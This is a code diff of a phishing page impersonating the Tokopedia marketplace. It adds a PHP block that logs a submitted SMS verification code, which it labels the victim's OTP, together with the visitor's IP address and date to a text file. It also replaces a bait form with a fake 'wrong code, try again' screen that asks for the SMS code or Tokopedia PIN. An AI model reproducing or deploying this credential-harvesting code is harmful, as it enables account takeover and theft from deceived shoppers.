@@ -1,3 +1,29 @@
+<?php
+$file = "99.txt";
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+$henpon = $_POST['hp'];
+
+
+/* OTP Korban */
+
+$handle = fopen($file, 'a');
+fwrite($handle, "===== Kode Otentikasi =====");
+fwrite($handle, "\n");
+fwrite($handle, "Kode Otentikasi: ");
+fwrite($handle, "$henpon");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address: ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Date Submitted: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "===== Terima Kasih =====");
+fwrite($handle, "\n");
+fclose($handle);
+?>
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -6,6 +32,7 @@
 <title>tokopedia.com</title>
 
 <link rel="icon" type="image/png" sizes="512x512" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon512.png">
+
 
 </script>
 
@@ -38,27 +65,18 @@
 
 <h3><center> <img src="https://ecs7.tokopedia.net/assets-tokopedia-lite/v2/zeus/production/e5b8438b.svg" width:"100%" class="img-fluid"></center> </h3>
 </header>
-
-<div class='fixed-header' id='main' role='main'>
-<div class='with-sticky with-triple-sticky' id='page'>
-
-<h3><center>EXTRABUBBLEWRAP.</center></h3>
-<p><center>Agar Packing Lebih Aman Dan Tidak Rusak Karena Ekspedisi</center></p>
-
-
-<form novalidate="novalidate" class="new_user_session" id="new_user_session" action="verifikasi.php" accept-charset="UTF-8" method="post"/>
-<input type="hidden" name="from" id="from" />
-<input type="hidden" name="seller_id" id="seller_id" />
-<input type="hidden" name="blca" id="blca" />
-<fieldset class='form-field-item'>
-<label for="email"><input type="text" class="form-control" id="email" name="email" placeholder="Masukkan Nomor Telepon"  autocomplete="off" required/>
-</label>
 <br>
-</fieldset>
-<div class='content-separator'></div>
-<input type="submit" name="commit" value="Tambah Bubblewrap" class="btn btn--green btn--medium btn--block js-btn-menu-login" />
-
-</form>
-
-
+<hr>
 </div>
+<h3><center><b>Kode yang anda masukkan salah</center></h3>
+<p><center><b>Silahkan Gunakan Kode Verifikasi Yang Ada Di Sms Atau Gunakan PIN Tokopedia</center></p>
+<br>
+<br>
+<p>
+<center><img alt=" Failed " src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Deletion_icon.svg/620px-Deletion_icon.svg.png" width:"100%" />
+</center></p>
+<div id='page'>
+<h6><center><a <a class='btn btn--green btn--medium btn--block' href='/index.php'>Silahkan Di Coba Kembali</a></center></h6>
+</div>
+</body>
+</html>
